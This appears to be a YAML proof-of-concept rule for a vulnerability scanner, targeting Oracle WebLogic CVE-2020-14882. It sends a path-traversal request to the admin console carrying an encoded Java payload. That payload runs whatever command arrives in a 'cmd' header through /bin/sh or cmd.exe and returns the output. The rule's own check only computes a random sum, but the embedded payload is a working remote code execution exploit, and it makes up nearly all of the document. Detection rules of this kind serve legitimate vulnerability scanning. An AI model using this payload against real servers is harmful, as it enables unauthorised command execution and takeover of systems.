name: poc-yaml-weblogic-cve-2020-14882
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  - method: GET
    path: /console/css/../consolejndi.portal%3ftest_handle%3dcom.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread+currentThread+%3d+(weblogic.work.ExecuteThread)Thread.currentThread()%3b+weblogic.work.WorkAdapter+adapter+%3d+currentThread.getCurrentWork()%3b+java.lang.reflect.Field+field+%3d+adapter.getClass().getDeclaredField("connectionHandler")%3bfield.setAccessible(true)%3bObject+obj+%3d+field.get(adapter)%3bweblogic.servlet.internal.ServletRequestImpl+req+%3d+(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj)%3b+String+cmd+%3d+req.getHeader("cmd")%3bString[]+cmds+%3d+System.getProperty("os.name").toLowerCase().contains("window")+%3f+new+String[]{"cmd.exe",+"/c",+cmd}+%3a+new+String[]{"/bin/sh",+"-c",+cmd}%3bif(cmd+!%3d+null+){+String+result+%3d+new+java.util.Scanner(new+java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next()%3b+weblogic.servlet.internal.ServletResponseImpl+res+%3d+(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req)%3bres.getServletOutputStream().writeStream(new+weblogic.xml.util.StringInputStream(result))%3bres.getServletOutputStream().flush()%3b}+currentThread.interrupt()%3b')
    headers:
      cmd: '/bin/bash -c ''expr {{r1}} + {{r2}}'''
    expression: |
      response.body.bcontains(bytes(string(r1 + r2)))
detail:
    author: godamos
